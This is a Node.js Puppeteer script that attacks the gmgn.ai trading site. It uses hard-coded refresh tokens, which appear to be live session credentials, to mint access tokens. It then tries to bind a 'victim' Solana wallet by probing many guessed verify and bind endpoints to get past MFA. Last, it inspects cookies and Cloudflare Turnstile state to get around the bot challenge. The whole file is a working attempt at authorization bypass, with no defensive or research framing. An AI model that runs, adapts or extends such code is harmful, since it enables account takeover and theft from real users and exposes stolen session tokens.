const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
puppeteer.use(StealthPlugin());

const ORIG_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQyOTAwLCJpYXQiOjE3ODQxNTA5MDAsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTQzNDJhZDAtMzUyMy00YTBmLWJkZGYtMDRkMTNlMTM4NTUyIiwibmJmIjoxNzg0MTUwOTAwLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.bXzzrW0ZgFMJ4_oX8NBY6pvHwZ2i1GfcP2gAD89Q2ZLGvugnRXSHrvcUzKXfHZoOn1Zxkq3e4Wd1WtMk2WlLow';
const FRESH_REFRESH = 'eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiJhMWQ2ZGZlNC1iODhmLTRjNTgtOThkYi00MmU0MmFhMjRmZDYiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNS0yMTYxLTE4ZDViMTAiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NzQ0NDA3LCJpYXQiOjE3ODQxNTI0MDcsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiMDYyNTVmMTAtNmVkZi00YmRiLWFiNjAtZGEzZDQwNmQ4YTgzIiwibmJmIjoxNzg0MTUyNDA3LCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiYTFkNmRmZTQtYjg4Zi00YzU4LTk4ZGItNDJlNDJhYTI0ZmQ2IiwidmVyIjoiMS4wIn0.uCsdhElzc2R3WZhvzcnHx3ZsvBRmzVA7dKT5J2fK92PDsg5troyv9_4ndY3yaLpgXwrEPsSyS66dsKrKebghmQ';
const PARAMS = 'device_id=de620a57-d98e-4293-b007-5d315455e21d&client_id=gmgn_web_20260715-2161-18d5b10&app_ver=20260715-2161-18d5b10&from_app=gmgn';
const TARGET = '5KCVo4xnj8n38FUyF2gFUzgJbDW9vV4C1bTpciznyciU';

(async () => {
    const browser = await puppeteer.launch({headless: 'new', args: ['--no-sandbox']});
    const page = await browser.newPage();
    await page.goto('https://gmgn.ai', {waitUntil: 'networkidle2', timeout: 20000});
    await new Promise(r => setTimeout(r, 2000));
    
    const result = await page.evaluate(async (origRefresh, freshRefresh, params, target) => {
        const log = [];
        
        // Get fresh token
        let r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: freshRefresh})
        });
        let data = await r.json();
        if (data.code !== 0) return {error: 'fresh token fail'};
        const freshToken = data.data.data.token;
        const freshH = {'Content-Type': 'application/json', 'Authorization': 'Bearer ' + freshToken};
        log.push('Fresh token OK');
        
        // Get orig token
        r = await fetch('/account/account/refresh_access_token', {
            method: 'POST', headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({refresh_token: origRefresh})
        });
        data = await r.json();
        const origToken = data.code === 0 ? data.data.data.token : null;
        log.push('Orig token: ' + (origToken ? 'OK' : 'FAIL - ' + data.message));
        
        // IDEA: Original account has "already bound wallet" error on bind_wallet
        // But what about UNBIND then REBIND with victim?
        // The unbind_wallet usage is available and we already got txn_ids for it!
        // If orig unbind requires only captcha (which we proved has request_id issue)...
        // What if we look for a DIFFERENT verify endpoint that doesn't need request_id?
        
        // Let's focus on the fresh account and try ALL possible verify endpoints
        log.push('=== Finding all /account/mfa/ endpoints ===');
        
        // Generate fresh txn_id
        r = await fetch('/account/account/generate_mfa_params?' + params, {
            method: 'POST', headers: freshH,
            body: JSON.stringify({usage: 'bind_wallet', biz_params: {address: target, wallet_type: 'sol', chain: 'sol'}})
        });
        data = await r.json();
        if (data.code !== 0) return {error: 'mfa gen fail', data};
        const txnId = data.data.data.txn_id;
        log.push('txn_id: ' + txnId);
        
        // Try EVERY possible way to verify/complete the txn
        const verifyAttempts = [
            // Maybe there's a verify endpoint that doesn't need request_id
            {url: '/account/mfa/txn/v1/verify', body: {txn_id: txnId, usage: 'bind_wallet'}},
            {url: '/account/mfa/txn/v1/complete', body: {txn_id: txnId, usage: 'bind_wallet'}},
            {url: '/account/mfa/txn/v1/confirm', body: {txn_id: txnId}},
            {url: '/account/mfa/v1/verify_captcha', body: {txn_id: txnId, usage: 'bind_wallet', captcha_data: 'test'}},
            // Try the SRP auth endpoint - maybe we can auth differently
            {url: '/account/mfa/txn/v1/verify_password', body: {txn_id: txnId, usage: 'bind_wallet', password: 'test'}},
            // What about direct bind without the /account prefix?
            {url: '/wallet-api/v1/bind_wallet', body: {address: target, wallet_type: 'sol', chain: 'sol'}},
            {url: '/tapi/v1/wallet/bind', body: {address: target, chain: 'sol'}},
            // Try the trade_token approach - get a trade token for victim wallet
            {url: '/account/trade_token', body: {wallet_address: target, secret: 'a'}},
        ];
        
        for (const attempt of verifyAttempts) {
            r = await fetch(attempt.url + '?' + params, {
                method: 'POST', headers: freshH,
                body: JSON.stringify(attempt.body)
            });
            
            if (r.status === 404) continue;
            
            try {
                data = await r.json();
                const code = data.code;
                const msg = data.message || '';
                
                if (code === 0) {
                    log.push('SUCCESS: ' + attempt.url + ' → ' + JSON.stringify(data).substring(0, 200));
                    return {log, success: true, endpoint: attempt.url, data};
                }
                
                // Log interesting non-404 errors
                if (msg && !msg.includes('not found')) {
                    log.push(attempt.url.split('/').pop() + ': ' + code + ' ' + msg.substring(0, 60));
                }
            } catch(e) {}
        }
        
        // FINAL IDEA: What if we can get the Turnstile implicit token from the page?
        // Cloudflare managed challenge might have already been solved when we loaded the page
        log.push('=== Checking for existing CF challenge token ===');
        
        // Check if cf_clearance cookie exists (means challenge was solved)
        const cookies = document.cookie;
        log.push('Cookies: ' + cookies.substring(0, 200));
        
        // Check for __cf_bm which means CF verified us
        const hasCfBm = cookies.includes('__cf_bm');
        log.push('Has __cf_bm: ' + hasCfBm);
        
        // The key insight: Turnstile managed mode might auto-solve
        // Check if there's a global turnstile response
        if (window.turnstile) {
            log.push('turnstile methods: ' + Object.keys(window.turnstile).join(', '));
            
            // Try to get a response from any existing widget
            const widgets = document.querySelectorAll('iframe[src*="turnstile"]');
            log.push('Turnstile iframes: ' + widgets.length);
        }
        
        return {log, txnId};
    }, ORIG_REFRESH, FRESH_REFRESH, PARAMS, TARGET);
    
    console.log(JSON.stringify(result, null, 2));
    await browser.close();
})();
